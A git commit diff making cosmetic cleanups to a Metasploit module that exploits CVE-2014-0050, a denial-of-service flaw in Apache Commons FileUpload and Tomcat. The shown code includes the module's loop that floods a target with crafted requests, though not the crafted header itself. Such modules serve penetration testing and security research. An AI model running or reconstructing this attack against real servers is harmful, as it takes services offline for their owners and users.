449d0d63d109bbfb07da9e5b0ca5af58e6d8b5b9
jvazquez-r7 <juan_vazquez@rapid7.com>
2014-02-26 08:52:51 -0600

    Do small clean up

--- modules/auxiliary/dos/http/apache_commons_fileupload_dos.rb
+++ modules/auxiliary/dos/http/apache_commons_fileupload_dos.rb
@@ -14,16 +14,16 @@ class Metasploit4 < Msf::Auxiliary
     super(update_info(info,
       'Name'            => 'Apache Commons FileUpload and Apache Tomcat DoS',
       'Description'     => %q{
-          This module triggers an infinite loop in Apache Commons FileUpload 1.0 through 1.3
-        via a Content-Type header.
-        Apache Tomcat 7 and Apache Tomcat 8 use a copy of Apache Commons FileUpload
-        to handle mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50
-        and 8.0.0-RC1 through 8.0.1 are affected by this issue.
-        Tomcat 6 also uses Commons FileUpload as part of the Manager application.
+        This module triggers an infinite loop in Apache Commons FileUpload 1.0
+        through 1.3 via a specially crafted Content-Type header.
+        Apache Tomcat 7 and Apache Tomcat 8 use a copy of FileUpload to handle
+        mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50
+        and 8.0.0-RC1 through 8.0.1 are affected by this issue. Tomcat 6 also
+        uses Commons FileUpload as part of the Manager application.
        },
        'Author'         =>
          [
-           'Unknown', #This issue was reported to the Apache Software Foundation and accidently made public.
+           'Unknown', # This issue was reported to the Apache Software Foundation and accidentally made public.
            'ribeirux' # metasploit module
          ],
        'License'        => MSF_LICENSE,
@@ -32,7 +32,7 @@ class Metasploit4 < Msf::Auxiliary
            ['CVE', '2014-0050'],
            ['URL', 'http://markmail.org/message/kpfl7ax4el2owb3o'],
            ['URL', 'http://tomcat.apache.org/security-8.html'],
-           ['URL', 'http://tomcat.apache.org/security-7.html'],
+           ['URL', 'http://tomcat.apache.org/security-7.html']
          ],
         'DisclosureDate' => 'Feb 6 2014'
       ))
@@ -58,14 +58,14 @@ class Metasploit4 < Msf::Auxiliary
     }
 
     for x in 1..datastore['RLIMIT']
-      print_status("Sending request #{x} to #{rhost}:#{rport}")
+      print_status("Sending request #{x} to #{peer}")
       begin
         c = connect
         r = c.request_cgi(opts)
         c.send_request(r)
         # Don't wait for a response
       rescue ::Rex::ConnectionError => exception
-        print_error("#{rhost}:#{rport} - Unable to connect: '#{exception.message}'")
+        print_error("#{peer} - Unable to connect: '#{exception.message}'")
         return
       ensure
         disconnect(c) if c
